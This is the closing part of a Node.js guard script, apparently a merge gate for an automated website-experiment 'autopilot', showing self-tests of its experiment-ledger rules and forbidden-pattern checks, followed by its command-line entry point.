    expect('an experiment is not held to a due date when it is reverted as inconclusive', { base: shippedExperiment, ledger: false, setup: () => write(LEDGER, `${oldExperiment({ status: 'reverted', pr: 59, shipped_on: '2026-10-03', verdict: 'inconclusive', notes: 'The variant broke on old phones; removed in #61.' })}\n`) });
    // A closed-unmerged record on main never shipped: it takes notes, but never a ship day, a result or an evaluation
    // date. (A ship day would be checked against the day its record reached main, which is no merge.)
    const closedRecord = (extra = {}) => lifecycle({ status: 'reverted', verdict: 'inconclusive', pr: 61, notes: 'Closed unmerged after 7 days.', ...extra });
    const closedBase = untidyBase('base-closed-record', `${closedRecord()}\n`, MERGED_SEP_3);
    expect('a closed-unmerged record on main can take a note', { base: closedBase, ledger: false, setup: () => write(LEDGER, `${closedRecord({ notes: 'Closed unmerged after 7 days. Its idea is back in the backlog.' })}\n`) });
    expect('a closed-unmerged record on main cannot be given a ship day', { base: closedBase, ledger: false, setup: () => write(LEDGER, `${closedRecord({ shipped_on: '2026-09-03' })}\n`), rules: ['ledger'], messages: ['a "reverted" entry that never shipped (the record of a pull request that closed unmerged) keeps "shipped_on" null'] });
    for (const [field, value] of [['result', { rate: 0.3, n: 40 }], ['evaluated_on', '2026-10-14']]) {
      expect(`a closed-unmerged record on main cannot be given ${field}`, { base: closedBase, ledger: false, setup: () => write(LEDGER, `${closedRecord({ [field]: value })}\n`), rules: ['ledger'], messages: [`"${field}" is ${JSON.stringify(value)} on a "reverted" entry without "shipped_on"`] });
    }
    expect('a proposed entry closed unmerged cannot be marked evaluated', { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ status: 'reverted', verdict: 'inconclusive', pr: 61, evaluated_on: '2026-10-14', notes: 'Closed unmerged.' })}\n`), rules: ['ledger'], messages: ['"evaluated_on" is "2026-10-14" on a "reverted" entry without "shipped_on"'] });
    const earlyConclusionBase = untidyBase('base-early-conclusion', `${conclude({ evaluated_on: '2026-09-10' })}\n`, MERGED_SEP_3);
    expect('an early conclusion already on main only warns on a note', { base: earlyConclusionBase, ledger: false, setup: () => write(LEDGER, `${conclude({ evaluated_on: '2026-09-10', notes: 'Context.' })}\n`), warned: ['its due date 2026-09-20', 'already on the base'] });
    expect('an entry judged before it shipped', { base: lifecycleShippedBase, ledger: false, setup: () => write(LEDGER, `${judgedOn('2026-09-02')}\n`), rules: ['ledger'], messages: ['"evaluated_on" 2026-09-02 is before "shipped_on" 2026-09-03'] });
    expect('an entry judged before its date', { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${judgedOn('2026-08-31')}\n`), rules: ['ledger'], messages: ['"evaluated_on" 2026-08-31 is before the entry\'s date 2026-09-01'] });
    expect('an entry judged in the future', { base: lifecycleShippedBase, ledger: false, setup: () => write(LEDGER, `${judgedOn('2026-10-17')}\n`), rules: ['ledger'], messages: ['"evaluated_on" 2026-10-17 is in the future (today is 2026-10-15, UTC)'] });
    expect('an entry concluded with an empty result', { base: lifecycleShippedBase, ledger: false, setup: () => write(LEDGER, `${judgedOn('2026-10-14', { result: {} })}\n`), rules: ['ledger'], messages: ['"result" is an empty object'] });
    // A ship date before the entry's date that is already on main cannot change, so it only warns.
    const earlyShipBase = untidyBase('base-early-ship', `${shipOn('2026-08-31')}\n`);
    expect('a ship date before its date on main only warns when the entry is concluded', { base: earlyShipBase, ledger: false, setup: () => write(LEDGER, `${judgedOn('2026-10-14', { shipped_on: '2026-08-31' })}\n`), warned: ['"shipped_on" 2026-08-31 is before the entry\'s date 2026-09-01', 'already on the base'] });
    // Until it ships an entry has no shipped_on, verdict, result or evaluation date, and until it is judged no verdict,
    // result or evaluation date: otherwise bookkeeping could not mark it shipped, or the evaluation would never pick it.
    expect('a proposed entry given a ship date without being marked shipped', { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ shipped_on: '2026-09-03' })}\n`), rules: ['ledger'], messages: ['"shipped_on" is "2026-09-03" on a "proposed" entry; it stays null until its pull request has merged and the entry is marked shipped'] });
    for (const [field, value] of [['verdict', 'keep'], ['result', { rate: 0.45 }], ['evaluated_on', '2026-10-14']]) {
      const message = `"${field}" is ${JSON.stringify(value)} on a "shipped" entry; it stays null until the entry is judged, when its status moves to concluded or reverted`;
      expect(`a proposed entry marked shipped with ${field} already set`, { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ status: 'shipped', ...lifecycleShipping, [field]: value })}\n`), rules: ['ledger'], messages: [message] });
      expect(`a shipped entry given ${field} without being concluded`, { base: lifecycleShippedBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ status: 'shipped', ...lifecycleShipping, [field]: value })}\n`), rules: ['ledger'], messages: [message] });
    }
    // A revert puts back what its merge deleted (the skill's §5.6): when an entry moves to reverted with verdict revert,
    // the lines its merge commit deleted from a file may come back to that file unchanged, even owner code the
    // autopilot could never add (browser storage, an address on another host). Nothing else comes back with them.
    {
      const REQUEST = "export const gmail = (to: string) => 'https://mail.google.com/mail/?view=cm&to=' + to;\nexport function Request() {\n  return <a href=\"/request-analysis\">Ask</a>;\n}\n";
      run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', 'base-reverted-merge');
      write('components/Request.tsx', REQUEST); run('add', '-A'); runAt('2026-10-09T09:00:00+00:00', 'commit', '-q', '-m', 'owner code that names another host');
      const storeEntry = (extra = {}) => entry('2026-10-10-store', extra);
      write('components/Store.tsx', STORE.replace("  try { return window.localStorage.getItem('units'); } catch { return null; }\n", '  return null;\n'));
      remove('components/Request.tsx');
      write(LEDGER, `${BASE_LEDGER}${storeEntry()}\n`); run('add', '-A'); runAt('2026-10-11T16:00:00+00:00', 'commit', '-q', '-m', 'Autopilot: forget the unit choice (#70)');
      const shipped = storeEntry({ status: 'shipped', pr: 70, shipped_on: '2026-10-11' });
      write(LEDGER, `${BASE_LEDGER}${shipped}\n`); run('add', '-A'); runAt('2026-10-12T09:00:00+00:00', 'commit', '-q', '-m', 'bookkeeping: shipped');
      const branch = 'autopilot/2026-10-14-revert-store';
      const revertLine = entry('2026-10-14-revert-store', { kind: 'revert', evaluate_after: null });
      const undone = storeEntry({ status: 'reverted', pr: 70, shipped_on: '2026-10-11', verdict: 'revert', evaluated_on: '2026-10-14', notes: 'Visitors lost their unit choice; reverted in #72.' });
      const reverting = (line = undone) => write(LEDGER, `${BASE_LEDGER}${line}\n${revertLine}\n`);
      const revertCase = (label, setup, options = {}) => expect(label, { base: 'base-reverted-merge', branch, ledger: false, setup, ...options });
      revertCase('a revert puts back the lines its merge deleted', () => { write('components/Store.tsx', STORE); write('components/Request.tsx', REQUEST); reverting(); });
      revertCase('lines a merge deleted are new while its entry is not marked reverted', () => { write('components/Store.tsx', STORE); write('components/Request.tsx', REQUEST); reverting(shipped); }, { rules: ['forbidden-pattern'], messages: ['components/Store.tsx:2 browser storage', 'components/Request.tsx:1 an address on another host (mail.google.com)'] });
      revertCase('a revert verdict on another entry puts back none of them', () => { write('components/Store.tsx', STORE); write(LEDGER, `${entry('2026-10-01-first', { ...FIRST, shipped_on: '2026-10-15', verdict: 'revert', evaluated_on: '2026-10-15', status: 'reverted', notes: 'Reverted in #72.' })}\n${shipped}\n${revertLine}\n`); }, { rules: ['forbidden-pattern'], messages: ['components/Store.tsx:2 browser storage'] });
      revertCase('a revert puts lines back only in the file they came from', () => { write('components/Saved.tsx', STORE); reverting(); }, { rules: ['forbidden-pattern'], messages: ['components/Saved.tsx:2 browser storage'] });
      revertCase('a revert puts back each line only as often as it was deleted', () => { write('components/Store.tsx', STORE.replace('export function other', "export function again() {\n  try { return window.localStorage.getItem('units'); } catch { return null; }\n}\nexport function other")); reverting(); }, { rules: ['forbidden-pattern'], messages: ['components/Store.tsx:5 browser storage'], absent: ['components/Store.tsx:2'] });
      revertCase('a revert cannot bring a new line in with the old ones', () => { write('components/Store.tsx', STORE.replace("getItem('units')", "getItem('units-v2')")); reverting(); }, { rules: ['forbidden-pattern'], messages: ['components/Store.tsx:2 browser storage'] });
    }

    // The guard reads commits: work not yet committed fails the check; an untracked file is a warning.
    expect('a change not yet committed', { setup: () => {}, dirty: () => write('components/Card.tsx', component('window.localStorage.setItem("k", v);')), rules: ['uncommitted'], messages: ['components/Card.tsx', 'not committed'] });
    expect('an untracked file is a warning', { setup: () => {}, dirty: () => write('components/Draft.tsx', 'export const d = 1;\n'), warned: ['untracked'] });

    // Metric names: read from the base, never the pull request; unknown names already on the base only warn.
    expect('a pull request cannot register a metric name for its own entry', { ledger: false, setup: () => { write(METRICS, METRICS_TEXT.replace('\n\nAn answer signal', '\n| `new_metric@v1` | Added by this pull request. | Higher is better. |\n\nAn answer signal')); fs.appendFileSync(path.join(dir, LEDGER), `${proposal({ primary_metric: 'new_metric@v1' })}\n`); }, rules: ['ledger', 'protected-path'], messages: ['"primary_metric" "new_metric@v1" is not a metric defined', 'autopilot/metrics.md'] });
    const metricsBase = (label, text) => { run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', label); if (text === null) remove(METRICS); else write(METRICS, text); run('add', '-A'); run('commit', '-q', '-m', label); return label; };
    const noMetrics = metricsBase('base-no-metrics', null);
    expect('a missing metrics file fails every new entry closed', { base: noMetrics, setup: () => {}, rules: ['ledger'], messages: [`${METRICS}:null is missing on the base`] });
    expect('a missing metrics file does not block bookkeeping without new lines', { base: noMetrics, ledger: false, setup: () => write('autopilot/backlog.md', '# Backlog\n- Re-ranked.\n') });
    for (const [label, text] of [['no Definitions section', METRICS_TEXT.replace('## 1. Definitions', '## 1. Terms')], ['unversioned names', METRICS_TEXT.replace(/@v1`/g, '`')], ['names outside the first column', METRICS_TEXT.replace(/\| `([a-z_]+@v1)` \(([^)]+)\) \|/g, '| $2 | `$1` |')], ['an empty file', '']]) {
      expect(`a metrics file with ${label} fails every new entry closed`, { base: metricsBase(`base-metrics-${cases}`, text), setup: () => {}, rules: ['ledger'], messages: [`${METRICS}:null defines no metric names on the base`] });
    }
    const unknownLine = entry('2026-10-01-old', { primary_metric: 'engaged_visit_rate', guardrails: ['bounce'] });
    const unknownBase = untidyBase('base-unknown-metrics', `${unknownLine}\n`, MERGED_OCT_3);
    expect('unknown metric names on an untouched base line only warn', { base: unknownBase, setup: () => write('components/Card.tsx', 'export const y = 2;\n'), warned: ['"primary_metric" "engaged_visit_rate" is not a metric defined', '"guardrails" "bounce" is not a metric', 'already on the base'] });
    expect('unknown metric names on a base line being shipped only warn', { base: unknownBase, ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-old', { primary_metric: 'engaged_visit_rate', guardrails: ['bounce'], status: 'shipped', pr: 59, shipped_on: '2026-10-03' })}\n`), warned: ['"primary_metric" "engaged_visit_rate" is not a metric defined', 'already on the base'], absent: ['engaged_visit_rate'] });
    expect('unknown metric names on a base line cannot be rewritten', { base: unknownBase, ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-old')}\n`), rules: ['ledger'], messages: ['changed "primary_metric", "guardrails"'] });
    const noGuardrailBase = untidyBase('base-no-guardrail', `${entry('2026-10-01-old', { guardrails: [] })}\n`, MERGED_OCT_3);
    expect('a base line without a guardrail only warns when it is shipped', { base: noGuardrailBase, ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-old', { guardrails: [], status: 'shipped', pr: 59, shipped_on: '2026-10-03' })}\n`), warned: ['"guardrails" is empty; a "change" entry needs at least one', 'already on the base'] });
    // A broken base line may be repaired, but its fields were never on the base: its metric names are checked as a new entry's are.
    const brokenBase = untidyBase('base-broken-line', `${BASE_LEDGER}{"id": "2026-10-10-broken", "kind": "change", oops\n`);
    const repair = (extra = {}) => `${BASE_LEDGER}${entry('2026-10-10-broken', extra)}\n`;
    expect('a broken line on the base is a warning', { base: brokenBase, setup: () => {}, warned: ['does not parse as JSON', 'already on the base'] });
    expect('a broken base line repaired with registered metrics', { base: brokenBase, ledger: false, setup: () => write(LEDGER, `${repair()}${proposal()}\n`) });
    expect('a broken base line repaired with an invented metric and no guardrail', { base: brokenBase, ledger: false, setup: () => write(LEDGER, `${repair({ primary_metric: 'made_up_metric', guardrails: [] })}${proposal()}\n`), rules: ['ledger'], messages: ['"primary_metric" "made_up_metric" is not a metric defined', '"guardrails" is empty; a "change" entry needs at least one'] });
    expect('a broken base line repaired without a minimum sample or with blank text', { base: brokenBase, ledger: false, setup: () => write(LEDGER, `${repair(UNREGISTERED)}${proposal()}\n`), rules: ['ledger'], messages: ['a change requires "min_sample"', '"hypothesis" is empty', '"decision_rule" is empty'] });
    expect('a broken base line repaired with an invented guardrail by a bookkeeping pull request', { base: brokenBase, ledger: false, setup: () => write(LEDGER, repair({ guardrails: ['bounce'] })), rules: ['ledger'], messages: ['"guardrails" "bounce" is not a metric'] });
    expect('a broken base line repaired without a measured baseline or windows', { base: brokenBase, ledger: false, setup: () => write(LEDGER, `${repair({ baseline: {}, window_days: undefined })}${proposal()}\n`), rules: ['ledger'], messages: ['needs "baseline"."window"', 'a change requires "window_days"'] });
    // A repaired line keeps an id of its own: a copy of another entry would leave two lines with one id on main.
    expect('a broken base line repaired into a copy of an earlier entry', { base: brokenBase, ledger: false, setup: () => write(LEDGER, `${BASE_LEDGER}${entry('2026-10-01-first', { ...FIRST, shipped_on: '2026-10-02' })}\n`), rules: ['ledger'], messages: ['id "2026-10-01-first" is already used on line 1; a repaired line keeps an id of its own'] });
    const brokenMiddle = untidyBase('base-broken-middle', `${BASE_LEDGER}{"id": "2026-10-10-broken", oops\n${entry('2026-10-05-later')}\n`);
    expect('a broken base line repaired with the id of a later line', { base: brokenMiddle, ledger: false, setup: () => write(LEDGER, `${BASE_LEDGER}${entry('2026-10-05-later')}\n${entry('2026-10-05-later')}\n`), rules: ['ledger'], messages: ['id "2026-10-05-later" is already used on line 3'] });
    expect('a broken base line repaired with the id of this pull request\'s proposal', { base: brokenBase, ledger: false, setup: () => write(LEDGER, `${BASE_LEDGER}${proposal()}\n${proposal()}\n`), rules: ['ledger'], messages: [`id "${CHANGE_ID}" is already used on line 2`] });
    expect('a broken base line repaired with an id of its own beside a later line', { base: brokenMiddle, ledger: false, setup: () => write(LEDGER, `${BASE_LEDGER}${entry('2026-10-10-broken')}\n${entry('2026-10-05-later')}\n`) });
    run('checkout', '-q', '-f', brokenBase); run('checkout', '-q', '-B', 'base-broken-no-metrics'); remove(METRICS); run('add', '-A'); run('commit', '-q', '-m', 'broken line, no metrics');
    expect('a repaired base line fails closed without the metrics file', { base: 'base-broken-no-metrics', ledger: false, setup: () => write(LEDGER, repair()), rules: ['ledger'], messages: [`${METRICS}:null is missing on the base`] });
    expect('an untouched broken line does not need the metrics file', { base: 'base-broken-no-metrics', ledger: false, setup: () => write('autopilot/backlog.md', '# Backlog\n- Re-ranked.\n'), warned: ['does not parse as JSON'] });
    // A line that broke on main after it merged (a hand edit left a trailing comma) is held to the line as it last
    // parsed there, as an edited line is: only its mutable fields change, and its ship day is its merge's.
    const breakLine = (line) => line.replace(/}$/, ',}');
    run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', 'base-broken-later');
    write(LEDGER, `${BASE_LEDGER}${oldChange()}\n`); run('add', '-A'); runAt(MERGED_SEP_3, 'commit', '-q', '-m', 'the change merges on 2026-09-03');
    write(LEDGER, `${BASE_LEDGER}${breakLine(oldChange())}\n`); run('add', '-A'); runAt('2026-09-10T09:00:00+00:00', 'commit', '-q', '-m', 'a hand edit leaves a trailing comma');
    const repairedAs = (extra) => `${BASE_LEDGER}${oldChange(extra)}\n`;
    const brokeOn = (day) => `"shipped_on" is ${day}, but the entry's line reached main on 2026-09-03`;
    expect('a line broken after its merge is repaired and marked shipped on its merge day', { base: 'base-broken-later', ledger: false, setup: () => write(LEDGER, repairedAs({ status: 'shipped', ...LEGACY_SHIPPING })) });
    for (const day of ['2026-09-10', '2026-09-20']) expect(`a line broken after its merge cannot be marked shipped on ${day}`, { base: 'base-broken-later', ledger: false, setup: () => write(LEDGER, repairedAs({ status: 'shipped', pr: 59, shipped_on: day })), rules: ['ledger'], messages: [brokeOn(day)] });
    expect('a line broken after its merge cannot be concluded on a later ship day', { base: 'base-broken-later', ledger: false, setup: () => write(LEDGER, repairedAs({ status: 'concluded', pr: 59, shipped_on: '2026-09-25', verdict: 'keep', result: { rate: 0.45, n: 200 }, evaluated_on: '2026-10-14' })), rules: ['ledger'], messages: [brokeOn('2026-09-25')] });
    expect('a line broken after its merge cannot be repaired with other windows', { base: 'base-broken-later', ledger: false, setup: () => write(LEDGER, repairedAs({ window_days: 28, evaluate_after: '2026-09-29' })), rules: ['ledger'], messages: ['changed "window_days", "evaluate_after"'] });
    expect('a line broken after its merge cannot be repaired under another id', { base: 'base-broken-later', ledger: false, setup: () => write(LEDGER, `${BASE_LEDGER}${entry('2026-09-01-change-b', { evaluate_after: '2026-09-20', status: 'shipped', pr: 59, shipped_on: '2026-09-10' })}\n`), rules: ['ledger'], messages: ['changed "id"'] });
    // A line that never parsed on main (an owner's line) has no earlier version: the whole schema binds the repair, and
    // its ship day is the day its text reached main.
    const brokenFromStart = untidyBase('base-broken-from-start', `${BASE_LEDGER}${breakLine(oldChange())}\n`, MERGED_SEP_3);
    expect('a line broken from the start is repaired and marked shipped on the day it reached main', { base: brokenFromStart, ledger: false, setup: () => write(LEDGER, repairedAs({ status: 'shipped', ...LEGACY_SHIPPING })) });
    expect('a line broken from the start cannot be marked shipped on a later day', { base: brokenFromStart, ledger: false, setup: () => write(LEDGER, repairedAs({ status: 'shipped', pr: 59, shipped_on: '2026-09-20' })), rules: ['ledger'], messages: ['"shipped_on" is 2026-09-20, but the broken line reached main on 2026-09-03'] });
    // The repository's own metrics file defines the names its seed ledger lines and its §4 example use, and they meet
    // the whole schema; the example is also a valid new proposal on its own branch.
    {
      cases += 1;
      const root = path.join(__dirname, '..');
      const text = fs.readFileSync(path.join(root, METRICS), 'utf8');
      const names = metricNames(text) || new Set();
      const example = /^## 4\.[\s\S]*?```json\n(.+)\n```/m.exec(text);
      const lines = fs.readFileSync(path.join(root, LEDGER), 'utf8').split('\n').filter((line) => line.trim());
      const used = ['answered_visit_rate@v1', 'one_page_no_action_rate@v1', 'error_visit_rate@v1', 'web_vitals_p75@v1'];
      if (!used.every((name) => names.has(name)) || [...names].some((name) => !METRIC_NAME.test(name))) failures.push(`repository ${METRICS}: names ${JSON.stringify([...names])}`);
      if (!example) failures.push(`repository ${METRICS}: no §4 example line`);
      const today = new Date().toISOString().slice(0, 10);
      for (const [line, isExample] of [...lines.map((line) => [line, false]), [example ? example[1] : '{}', true]]) {
        const value = JSON.parse(line);
        const problems = [...ledgerEntryProblems(value, { today }).map((p) => p.message), ...metricProblems(value, names)];
        if (isExample) problems.push(...newEntryProblems(value, { branchDate: value.date, branchId: value.id, pr: null, today: value.date }));
        if (problems.length) failures.push(`repository ${isExample ? `${METRICS} §4 example` : 'ledger line'} ${value.id}: ${problems.join('; ')}`);
      }
    }

    run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', 'main-noledger'); remove(LEDGER); run('add', '-A'); run('commit', '-q', '-m', 'no ledger');
    expect('first ledger line on a base without one', { base: 'main-noledger', ledger: false, setup: () => write(LEDGER, `${proposal()}\n`) });
    expect('ledger missing on head', { base: 'main-noledger', ledger: false, setup: () => write('components/Card.tsx', 'export const z = 3;\n'), rules: ['ledger'], messages: ['missing'] });
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
  if (failures.length) {
    console.error(`autopilot-guard self-test: ${failures.length} of ${cases} cases failed`);
    for (const failure of failures) console.error(`  ${failure}`);
    return 1;
  }
  console.log(`autopilot-guard self-test: ${cases} cases passed (${PROTECTED.length} protected patterns, ${ALLOWED.length} allowed areas, ${FORBIDDEN.length + FORBIDDEN_MARKUP.length} forbidden patterns, ${BANNED.length} banned phrases)`);
  return 0;
}

// ---------- CLI ----------

function main(argv) {
  if (argv.includes('--self-test')) return selfTest();
  const option = (name) => { const at = argv.indexOf(name); return at >= 0 ? argv[at + 1] : undefined; };
  const json = argv.includes('--json');
  try {
    const prArg = option('--pr');
    const pr = prArg ? Number(prArg) : null;
    if (prArg && !(Number.isInteger(pr) && pr > 0)) throw new GitError('--pr must be a pull request number');
    const result = check({ base: option('--base'), head: option('--head'), branch: option('--branch'), pr });
    console.log(json ? JSON.stringify(result, null, 2) : report(result));
    return result.ok ? 0 : 1;
  } catch (error) {
    if (!(error instanceof GitError)) {
      // A bug in the guard itself: the merge gate reads this JSON, so it shows the reason rather than an empty result.
      if (json) console.log(JSON.stringify({ ok: false, error: `the guard failed: ${String((error && error.message) || error).split('\n')[0]}` }, null, 2));
      throw error;
    }
    if (json) console.log(JSON.stringify({ ok: false, error: error.message }, null, 2));
    console.error(`autopilot-guard: ${error.message}\nUsage: node scripts/autopilot-guard.cjs --base <git-ref> --head <git-ref> [--branch <name>] [--pr <n>] [--json] | --self-test`);
    return 2;
  }
}

module.exports = { PROTECTED, ALLOWED, FORBIDDEN, BANNED, LIMITS, check, checkLedger, metricNames, protectedBy, readExperimentRegistry, runningChanges };

if (require.main === module) process.exitCode = main(process.argv.slice(2));
